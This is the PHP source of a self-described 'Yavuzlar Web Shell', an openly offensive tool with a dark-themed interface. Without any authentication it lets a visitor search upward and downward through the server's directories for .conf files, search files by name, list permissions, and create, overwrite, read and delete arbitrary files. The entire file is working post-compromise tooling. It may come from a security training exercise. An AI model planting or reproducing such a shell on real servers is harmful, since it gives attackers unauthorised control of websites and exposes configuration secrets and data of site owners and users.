<?php
session_start();
if(!empty($_GET['page'])){
    $page = $_GET['page'];
}else{
    $page=null;
}

if (!isset($_SESSION['current_directory'])) {
    $_SESSION['current_directory'] = getcwd();
}


if (isset($_POST['shell-up'])) {
    echo "hello";
    $_SESSION['current_directory'] = dirname($_SESSION['current_directory']);
}

function searchFiles($dir, $keyword) {
    $files = [];
    try {
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));

        foreach ($iterator as $file) {
            if ($file->isDir()) continue;

            if (strpos($file->getFilename(), $keyword) !== false) {
                $files[] = $file->getPathname();
            }
        }
    } catch (UnexpectedValueException $e) {
        echo "<div><h2>Access Denied: " . htmlspecialchars($dir) . "</h2></div>";
    }

    return $files;
}
function getFilePermissions($file) {
    if (!file_exists($file)) {
        return "Something Went Wrong";
    }

    if (!is_readable($file)) {
        return "Permission denied: Cannot access this file";
    }

    $perms = fileperms($file);

    switch ($perms & 0xF000) {
        case 0xC000: $info = 's'; break;
        case 0xA000: $info = 'l'; break;
        case 0x8000: $info = '-'; break;
        case 0x6000: $info = 'b'; break;
        case 0x4000: $info = 'd'; break;
        case 0x2000: $info = 'c'; break;
        case 0x1000: $info = 'p'; break;
        default:     $info = 'u';
    }


    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
              (($perms & 0x0800) ? 's' : 'x' ) :
              (($perms & 0x0800) ? 'S' : '-'));


    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
              (($perms & 0x0400) ? 's' : 'x' ) :
              (($perms & 0x0400) ? 'S' : '-'));


    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
              (($perms & 0x0200) ? 't' : 'x' ) :
              (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}


function listFilesWithPermissions($dir) {
    try {
        $files = new DirectoryIterator($dir);

        echo "<h2>Files in Directory: " . htmlspecialchars($dir) . "</h2>";
        echo "<table border='1' cellpadding='5'><tr><th>Filename</th><th>Permissions</th></tr>";

        foreach ($files as $file) {
            if ($file->isDot()) continue;
            
            $permissions = getFilePermissions($file->getPathname());
            echo "<tr><td>" . htmlspecialchars($file->getFilename()) . "</td><td>" . htmlspecialchars($permissions) . "</td></tr>";
        }

        echo "</table>";
    } catch (Exception $e) {
        echo "<h2>Access Denied: " . htmlspecialchars($dir) . "</h2>";
    }
}


?>





<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Yavuzlar Web Shell</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background-color: #282c34;
            color: #abb2bf;
            font-family: monospace;
            margin: 0;
            padding: 0;
        }

   
        .sidebar {
            height: 100%;
            width: 250px;
            position: fixed;
            top: 0;
            left: -250px;
            background-color: #2c313a;
            overflow-x: hidden;
            transition: 0.5s;
            padding-top: 20px;
        }

        .sidebar a {
            padding: 10px 15px;
            text-decoration: none;
            font-size: 18px;
            color: red;
            display: block;
            transition: 0.3s;
        }

        .sidebar a:hover {
            background-color: #3e4451;
        }

  
        .main {
            transition: margin-left .5s;
            padding: 16px;
            display: flex;
            flex-direction: column;
            height: 100vh;
        }

   
        .header {
            background-color: #383a42;
            color: #fafafa;
            display: flex;
            align-items: center;
            padding: 10px;
        }

        .header h1 {
            margin: 0;
            flex-grow: 1;
            padding-left: 10px;
        }

        #openNav {
            background-color: #383a42;
            color: white;
            border: none;
            padding: 10px;
            cursor: pointer; 
            font-size: 24px;
        }

        #openNav:hover {
            background-color: #6a6b70;
        }

  
        #shell {
            background: #222;
            box-shadow: 0 0 5px rgba(0, 0, 0, .3);
            font-size: 10pt;
            display: flex;
            flex-direction: column;
            align-items: stretch;
            flex-grow: 1;
            overflow: hidden;
            margin-top: 20px; 
        }

        #shell-content {
            overflow: auto;
            padding: 5px;
            white-space: pre-wrap;
            flex-grow: 1;
        }

        .shell-prompt {
            font-weight: bold;
            color: #75DF0B;
        }

        #shell-input {
            display: flex;
            padding: 10px 0;
            border: 2px solid #50a14f;
            border-radius: 4px;
            background: #333;
            color:white;
        }

        #shell-cmd {
            height: 30px;
            border: none;
            background: transparent;
            color: #eee;
            font-family: monospace;
            font-size: 10pt;
            width: 100%;
            outline: none;
            padding: 5px;
        }

        #shell-input label {
            padding-right: 5px;
        }

        #shell-search{
            color: white;
            display: flex;
            margin-top:10px;
            padding: 10px 10px;
            border: 2px solid #50a14f;
            border-radius: 4px;
            background: #333;
        }

        #shell-search:hover{
            background-color: red;

    

        }

        #shell-up{
            color: white;
            display: flex;
            margin-top:10px;
            padding: 10px 10px;
            border: 2px solid #50a14f;
            border-radius: 4px;
            background: #333;
        }

        #shell-up:hover{
            background-color: red;

    

        }
        h2{
            color:red;
        }
        #shell-label{
            font-size:20px;
            color:red;
        }

    </style>
</head>
<body>

<div class="sidebar" id="mySidebar">
    <a href="javascript:void(0)" onclick="w3_close()">Close &times;</a>
    <a href="shell.php?page=1">Config File Search</a>
    <a href="shell.php?page=2">Search File</a>
    <a href="shell.php?page=3">File Manager</a>
    <a href="shell.php?page=4">File Permissions</a>
    <a href="shell.php?page=5">Reset Shell</a>
</div>

<div id="main" class="main">
    <div class="header">
        <button id="openNav" onclick="w3_open()">&#9776;</button>
        <h1>Yavuzlar Web Shell</h1>
    </div>

    <div>
    <?php if($page ==  null):?>
        
        <?php $logo = '

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@@@@@@@@
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@@@@@@@
%%%%%%%%%%%%%%%%%%%%%%%%%#*+-+#%%%%%%%%%%%%%%%%%%#****+=:--:=#%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@@@@@@
%%%%%%%%%%%%%%%%%%%%%%#+-.:*%%%%%%%%%%%%%%%%%%*=...        .:==+#%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@@@@@
%%%%%%%%%%%#########+:..:*#%%%%%%%%%%%%%%%%%%#:       .        -#%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@@@@
##################=....+###############%%%%%%%-        .        ..=%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@@@
################-. . -#######################+.            ...     =%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@@
##############-. . .+########################-.          .      .::=#%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@
############+.   .:*########################+.     .             .-:.%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@
##########*:.   .:*########################=.    .         .    . .:#%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@
#########=.   . .*#########################.                      ..+%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@
########-..    .*##########################=  . ..  .          .  .*%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@
#######-.     .=############################*:.:                   *%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@
######:   .   :###################*:..:*######:                ....*%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@
#####: .     .+################*+=..  ..-*###-.        ..      .::*%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@
####-       .-*###########*+=:..         .:+=.   .             .=++#%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@
###+.       .=###########:. ..-: .:=. .   ...  .                 ..:+%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@
##*:.       .+#########=...=*#-..+###+.                        :+==+:%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@
##=.       .:*########=. .*##=..=######=..                  .-*####%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@
#*:        .:*########-:-+##+. .########*-.                   :*####%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@
#+.     .  .:*##############=. .+#########*=-.     .           .:*##%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@
#-         .:*##############*-.=#############=.          .       ..:-=*%%%%%%%%%%%%%%%%%%%%%%%%%%%@@
#:         .:*################################=.  ..                  .:+#%%%%%%%%#=:::+%%%%%%%%%%@@
*.     .    .+#################################*..                       .+%%%%%+.      :%%%**%%%%@@
*.          .=##################################*-..        ..       .    .+*=:.         -#=.=%%%%@@
*.       .  .-*###################################*-.  .                     .             .:*%%%%@@
*.           .+######################################+=:.. .                        .    .*%%%%%%%@@
*.           .-############################################+.             ...            -%%%%%%%%@@
#:            .+###########################################*-             :-.            ..-#%%%%%@@
#=.            .*############################################=.         .:#%+..       .:*=:-*%%%%%@@
#+.            .:*############################################+.    .  .-#%%+.  .     ....:#%%%%%%@@
#*-.      . .   .:*############################################+.      :*%%#-         .:*+:=%%%%%%@@
##+.             .:*############################################=. .    .#%*:          .:....:*%%%@@
##*-.             .:*############################################=.      .*=.            ...-+-%%%@@
###+.               .=#############################################-.     .:..                :%%%@@
####+.             . .:*#############################################-.   .=-..       ......-:+%%%@@
#####=.                .=*###########################################=.   .-#%+-.... .-#%%%%%%%%%%@@
######=.                 .=#########################################-...  .#%%%%#=.. -%%%%%%%%%%%%@@
#######=.              .   .-*#####################################-..=: .*%%%#-..  =%%%%%%%%%%%%%@@
########+. .                 ..+#################################*:..#+..#%%+:.   .+%%%%%%%%%%%%%%@@
#########*..                    .:+#############################-..=##:.=*.     .:*%%%%%%%%%%%%%%%@@
###########=.               ..      .-+*######################=. .=#*-         .-#%%%%%%%%%%%%%%%%@@
############*:.                        ..:-=+*##############*:...:..         .:*%%%%%%%%%%%%%%%%%@@@
##############+.                             .....::::::::....     .       .:+%%%%%%%%%%%%%%%%%%%@@@
################+:.        .                               .        .  .  .+#%%%%%%%%%%%%%%%%%%%%@@@
##################*:.       .                                          .:#%%%%%%%%%%%%%%%%%%%%%%%@@@
#####################+:..         .                       .       . .:+#%%%%%%%%%%%%%%%%%%%%%%%%@@@@
########################+:..                                    ..:+#%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@
###########################*=-..              .    .        ..-=*#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@
################################*+=:..   .           ...:=+*###%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@
#######################################***++++++++**##########%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@
############################################################%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@
##########################################################%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@
#########################################################%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@'?>
<?php
echo "<pre>";
echo $logo;
echo "</pre>";
?>
<?php endif;?>

        <?php if($page ==  1):?>
        <h1>Config File Search</h1>
            <h2>WARNING: CHOOSE LEVEL CAREFULLY</h2>
            <form action="shell.php" method = "GET" enctype= "multipart/form-data">
                <input type="text" id="shell-input" name="slvl" placeholder="Enter the Search Level">
                <input type="hidden" name="page" value=<?php echo $page;?>>
                <button id="shell-search">Search!</button>
            </form>

                        
        
        <!-- CONF SEARCH -->
        <?php
        $page = $_GET['page'];
        $dir = __DIR__;
        $maxLevelsUp = isset($_GET['slvl']) ? intval($_GET['slvl']) : 0;
        $downwardLimit = 3;

        function searchParentDirectories($dir, $downwardLimit, $currentDepth) {
            if ($currentDepth <= $downwardLimit) {
                try {
                    $files = new DirectoryIterator($dir);

                    foreach ($files as $file) {
                        if ($file->isDot()) continue;

                        if (!$file->isDir() && strtolower(pathinfo($file->getFilename(), PATHINFO_EXTENSION)) == 'conf') {
                            printf('<div><h1>%s</h1></div>', $file->getPathname());
                        }

                        if ($file->isDir()) {
                            searchParentDirectories($file->getPathname(), $downwardLimit, $currentDepth + 1);
                        }
                    }
                } catch (Exception $e) {
                    printf('<div><h1>Access Denied: %s</h1></div>', htmlspecialchars($dir));
                }
            }
        }

        function searchUpwardDirectories($dir, $maxLevelsUp, $downwardLimit) {
            $currentDir = $dir;
            $level = 0;

            while ($currentDir && $level <= $maxLevelsUp) {
                searchParentDirectories($currentDir, $downwardLimit, 0);
                $currentDir = dirname($currentDir);
                $level++;
            }
        }

        searchUpwardDirectories($dir, $maxLevelsUp, $downwardLimit);
        ?>
        <?php endif;?>
        <?php if($page ==  2):?>
            <div>

        <p>Current Directory: <?php echo $_SESSION['current_directory']; ?></p>


        <form action="" method="POST" enctype="multipart/form-data">
            <input type="text" id="shell-input" name="search" placeholder="Enter search term" />
            <button id="shell-search" name="shell-search">Search!</button>
            <button id="shell-up" name="shell-up">Go UP</button>
        </form>
        <?php endif;?>
    </div>
    <?php if($page ==  3):?>
        <h1>File Manager</h1>
        <form action="shell.php?page=3" method="post">
            <label  id="shell-label" for="filename">Create a New File:</label><br>
            <input type="text" id="shell-input" name="filename" placeholder="Enter file name" required><br><br>
            <button  id="shell-search" type="submit" name="create">Create File</button>
        </form>
        <form action="shell.php?page=3" method="post">
            <label id="shell-label" for="writefile">Select a File to Write:</label><br>
            <select id="shell-input" name="writefile">
                <?php
                $files = array_diff(scandir(__DIR__), ['.', '..', 'shell.php?page=3']);
                foreach ($files as $file) {
                    echo "<option value=\"$file\">$file</option>";
                }
                ?>
            </select><br><br>
            <label id="shell-label" for="content">Content:</label><br>
            <textarea  id="shell-input" name="content" placeholder="Enter content to write"></textarea><br><br>
            <button id="shell-search" type="submit" name="write">Write to File</button>
        </form>
        <form action="shell.php?page=3" method="post">
            <label id="shell-label" for="deletefile">Delete a File:</label><br>
            <select id="shell-input" name="deletefile">
                <?php
                foreach ($files as $file) {
                    echo "<option value=\"$file\">$file</option>";
                }
                ?>
            </select><br><br>
            <button id="shell-search" type="submit" name="delete">Delete File</button>
        </form>
        <form action="shell.php?page=3" method="post">
            <label id="shell-label" for="readfile">Select a File to Read:</label><br>
            <select  id="shell-input" name="readfile">
                <?php
                foreach ($files as $file) {
                    echo "<option value=\"$file\">$file</option>";
                }
                ?>
            </select><br><br>
            <button  id="shell-search" type="submit" name="read">Read File</button>
        </form>

        <div class="file-content">
            <h3>File Contents:</h3>
            <pre>
            <?php
            if (isset($_POST['read'])) {
                $readFile = $_POST['readfile'];
                if (file_exists($readFile)) {
                    echo htmlspecialchars(file_get_contents($readFile));
                } else {
                    echo "File does not exist.";
                }
            }
            ?>
            </pre>
        </div>

        <div class="file-list">
            <h3>Available Files:</h3>
            <?php
            foreach ($files as $file) {
                echo "<div class=\"file-item\"><strong>$file</strong></div>";
            }
            ?>
        </div>
    </div>

    <?php
    // File creation
    if (isset($_POST['create'])) {
        $filename = $_POST['filename'];
        if (!file_exists($filename)) {
            $handle = fopen($filename, 'w');
            fclose($handle);
            echo "<p>File '$filename' created successfully.</p>";
        } else {
            echo "<p>File '$filename' already exists.</p>";
        }
    }

    // File writing
    if (isset($_POST['write'])) {
        $file = $_POST['writefile'];
        $content = $_POST['content'];
        if (file_put_contents($file, $content)) {
            echo "<p>Successfully wrote to '$file'.</p>";
        } else {
            echo "<p>Failed to write to '$file'.</p>";
        }
    }

    // File deletion
    if (isset($_POST['delete'])) {
        $file = $_POST['deletefile'];
        if (unlink($file)) {
            echo "<p>File '$file' deleted successfully.</p>";
        } else {
            echo "<p>Failed to delete '$file'.</p>";
        }
    }
    ?>
    <?php endif; ?>

    <?php if ($page == 4): ?>
            <div>
                <h2>File Permissions</h2>
                <form action="" method="POST" enctype="multipart/form-data">
                <button id="shell-up" name="shell-up">Go UP</button>
        </form>

                <?php listFilesWithPermissions($_SESSION['current_directory']); ?>
            </div>
        <?php endif; ?>
        <?php if ($page == 5): ?>
            <h2> SHELL SESSION RESETED!</h2>
           <?php session_destroy();?>
        <?php endif; ?>



    <div id="output">
        <?php

        if (isset($_POST['search']) && !empty($_POST['search'])) {
            $searchKeyword = $_POST['search'];
            $currentDir = $_SESSION['current_directory'];


            $results = searchFiles($currentDir, $searchKeyword);

            if (!empty($results)) {
                echo "<h2>Search Results:</h2>";
                foreach ($results as $result) {
                    echo "<p>" . htmlspecialchars($result) . "</p>";
                }
            } else {
                echo "<h2>No results found for: " . htmlspecialchars($searchKeyword) . "</h2>";
            }
        }
        ?>
    </div>


</div>

<script>
    function w3_open() {
        document.getElementById("mySidebar").style.left = "0"; 
        document.getElementById("main").style.marginLeft = "250px";
    }

    function w3_close() {
        document.getElementById("mySidebar").style.left = "-250px";
        document.getElementById("main").style.marginLeft = "0";
    }
</script>

</body>
</html>
